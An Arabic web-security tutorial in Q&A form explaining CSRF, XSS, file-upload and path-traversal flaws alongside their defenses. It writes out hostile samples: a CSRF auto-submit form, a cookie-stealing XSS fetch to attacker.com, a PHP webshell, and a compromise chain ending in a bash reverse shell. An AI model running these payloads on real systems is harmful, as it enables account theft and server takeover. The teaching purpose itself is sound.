## 1. لماذا CSRF لا يحتاج اختراق؟

CSRF (Cross-Site Request Forgery) لا يتطلب اختراق الموقع نفسه لأنه يستغل **ثقة الموقع بالمتصفح/المستخدم**. الهجوم يعمل كالتالي:

- المهاجم يخدع المستخدم لزيارة صفحة ضارة
    
- هذه الصفحة تحتوي على طلبات (Forms، AJAX) موجهة للموقع المستهدف
    
- المتصفح يرسل تلقائياً ملفات تعريف الارتباط (Cookies) بما فيها جلسة تسجيل الدخول
    
- الموقع يرى الطلب كأنه صادر من المستخدم الشرعي
    

**مثال**: إذا كان المستخدم مسجلاً في موقع بنكي، يمكن للمهاجم خداعه لزيارة صفحة تحتوي على:

html

<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000">
  <input type="hidden" name="to" value="attacker_account">
</form>
<script>document.forms[0].submit();</script>

## 2. لماذا الجلسة وحدها لا تكفي؟

الجلسات (Sessions) تحمي من سرقة البيانات ولكنها لا تحمي من:

- **CSRF**: كما شرحنا سابقاً
    
- **الاختراق من نفس الجهاز**: إذا ترك المستخدم جهازه مفتوحاً
    
- **Session Fixation**: حيث يتحكم المهاجم بمعرف الجلسة
    
- **عدم صلاحية الجلسات للتخويل المحدد** (Authorization vs Authentication)
    

**الحلول المكملة**:

- CSRF Tokens
    
- إعادة المصادقة للمهام الحساسة
    
- التحقق من عنوان IP وUser-Agent
    
- صلاحية زمنية للجلسات
    

## 3. ما الفرق بين CSRF و XSS؟

|Aspect|CSRF|XSS|
|---|---|---|
|**الهدف**|تنفيذ إجراءات باسم المستخدم|سرقة بيانات أو التحكم في المتصفح|
|**المتطلبات**|جلسة نشطة للمستخدم|ثغرة في تطبيق الويب|
|**نقطة الهجوم**|موقع آخر يخدع المستخدم|الموقع نفسه عبر إدخال خبيث|
|**الحماية**|CSRF Tokens, SameSite cookies|Input validation, Output encoding|
|**التأثير**|محدود (إجراءات مسموح بها)|واسع (سرقة جلسات، تعديل صفحات)|

**مثال XSS**: إذا كان الموقع يعرض التعليقات دون تعقيم:

javascript

<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

## 4. لماذا رفع الملفات أخطر من النصوص؟

رفع الملفات أخطر لأنه:

1. **تنفيذ كود**: يمكن رفع ملفات تنفيذية (PHP، JSP، إلخ)
    
2. **تجاوز سعة التخزين**: ملفات كبيرة قد تسبب حجب الخدمة
    
3. **رفع ملفات خبيثة**: فيروسات، برمجيات خبيثة
    
4. **تجاوز الحماية**: الملفات قد تتجاوز فلاتر الإدخال
    

**مثال**: موقع يسمح برفع الصور دون تحقق:

- المهاجم يرفع `shell.php` باسم `image.php`
    
- الخادم ينفذ الملف ككود PHP
    
- المهاجم يحصل على وصول كامل للخادم
    

## 5. كيف يُنفّذ ملف صورة؟

تحدث هذه الثغرة عندما:

1. **الخادم يعالج كل الملفات كبرامج تنفيذية**
    
2. **التحقق من النوع سطحي**: يعتمد على الامتداد فقط
    
3. **تخزين الملفات في مجلدات قابلة للتنفيذ**
    

**طرق الاستغلال**:

- **حقن رؤوس الملفات**: إضافة كود PHP في بيانات EXIF للصورة
    

php

<?php system($_GET['cmd']); ?>
// ثم حفظ الملف كshell.jpg.php

- **تغيير Content-Type**: باستخدام أدوات مثل Burp Suite
    
- **استغلال التحليل المزدوج**: `shell.php.jpg` إذا كان الخادم يفحص الامتداد الأخير فقط
    

## 6. لماذا Path Traversal صامت؟

Path Traversal (أو Directory Traversal) يكون صامتاً لأن:

1. **لا يترك سجلات واضحة**: يبدو كطلب ملف عادي
    
2. **يتجنب أنظمة الكشف**: لا يحتوي على أنماط هجوم معروفة
    
3. **يمكن التمويه**: باستخدام الترميز (URL encoding، Unicode)
    
4. **يتسلل ضمن الصلاحيات العادية**
    

**مثال هجوم صامت**:

text

https://site.com/view?file=../../../../etc/passwd

مقابل هجوم ملفت:

text

https://site.com/admin?cmd=rm+-rf+/

## 7. لماذا realpath مهم؟

دالة `realpath()` في PHP (ومثيلاتها في لغات أخرى) مهمة لأنها:

1. **تحل المسارات الرمزية**: تحول `/var/www/../tmp` إلى `/tmp`
    
2. **تطبيع المسار**: تزيل `..` و `.` غير الضرورية
    
3. **تتحقق من وجود المسار الحقيقي**
    
4. **تمنع Path Traversal**: بالتحقق من أن المسار ضمن الدليل المسموح
    

**مثال آمن**:

php

$base = '/var/www/uploads/';
$userFile = $_GET['file'];
$realPath = realpath($base . $userFile);

// التحقق من أن المسار يبدأ بالمسار الأساسي
if (strpos($realPath, $base) === 0) {
    // آمن للاستخدام
}

## 8. كيف تُستغل الثقة بالمستخدم؟

تستغل الثغرات الأمنية ثقة الموقع بالمستخدم بعدة طرق:

**أمثلة**:

1. **CSRF**: ثقة الموقع بأن الطلب جاء من نية المستخدم الحقيقية
    
2. **التصيد (Phishing)**: ثقة المستخدم بالروابط والمواقع
    
3. **التفويض غير المنضبط**: ثقة الموقع بأن المستخدم لن يحاول الوصول لبيانات الآخرين
    
4. **رفع الملفات**: ثقة الموقع بأن المستخدم سيرفع فقط ملفات آمنة
    

**دراسة حالة - التفويض المكسور**:

python

# غير آمن - يثق بالمستخدم أن لا يحاول الوصول لبيانات الآخرين
@app.route('/profile/<user_id>')
def profile(user_id):
    return get_user_data(user_id)  # يمكن الوصول لأي مستخدم!

# آمن - التحقق من الصلاحية
@app.route('/profile/<user_id>')
def profile(user_id):
    if user_id != session['user_id']:
        return "غير مسموح"
    return get_user_data(user_id)

## 9. لماذا SameSite فعّال؟

سمة `SameSite` للكوكيز فعالة لأنها:

**كيف تعمل**:

- `SameSite=Strict`: الكوكي يرسل فقط مع طلبات من نفس الموقع
    
- `SameSite=Lax`: يرسل مع طلبات GET من نفس الموقع
    
- `SameSite=None`: يرسل دائماً (مع `Secure` في HTTPS)
    

**فعاليتها ضد CSRF**:

http

Set-Cookie: session=abc123; SameSite=Strict; HttpOnly; Secure

- يمنع المتصفح إرسال الكوكي مع طلبات من مواقع خارجية
    
- يحمي تلقائياً دون حاجة لتعديل الكود
    
- مدعوم في جميع المتصفحات الحديثة
    

**تقييد**: لا يحمي من هجمات XSS أو إذا تم اختراق الموقع نفسه.

## 10. كيف يؤدي رفع ملف لاختراق كامل؟

**سيناريو اختراق كامل عبر رفع ملف**:

1. **المرحلة 1: رفع Webshell**
    
    text
    
    <?php system($_GET['cmd']); ?>
    
    يتم رفعه كصورة مع حقن في البيانات الوصفية
    
2. **المرحلة 2: الحصول على موطئ قدم**
    
    bash
    
    https://victim.com/uploads/shell.jpg?cmd=whoami
    
3. **المرحلة 3: التصعيد**
    
    bash
    
    # البحث عن ثغرات في التكوين
    ?cmd=find / -perm -4000 2>/dev/null
    
    # قراءة ملفات التكوين
    ?cmd=cat /etc/passwd
    
    # الاتصال العكسي (Reverse Shell)
    ?cmd=bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
    
4. **المرحلة 4: الحركة الأفقية**
    
    - اختراق قواعد البيانات
        
    - سرقة جلسات المستخدمين
        
    - التحرك نحو الأنظمة الداخلية
        
5. **المرحلة 5: الثبات**
    
    - إضافة مستخدمين خفيين
        
    - تنصيب برمجيات خبيثة
        
    - إنشاء أبواب خلفية
        

**مثال حقيقي**: ثغرة في نظام إدارة المحتوى تسمح برفع ملفات PHP → اختراق الخادم → سرقة قاعدة بيانات → اختراق جميع الحسابات.

---

## أفضل الممارسات للوقاية:

1. **ضد CSRF**: استخدام CSRF tokens + SameSite cookies
    
2. **ضد XSS**: تعقيم المدخلات وتشفير المخرجات
    
3. **رفع الملفات**: التحقق من النوع، إعادة التسمية، التخزين خارج جذر الويب
    
4. **Path Traversal**: استخدام realpath()، التحقق من المسارات
    
5. **التفويض**: تطبيق مبدأ أقل صلاحية، التحقق في كل طبقة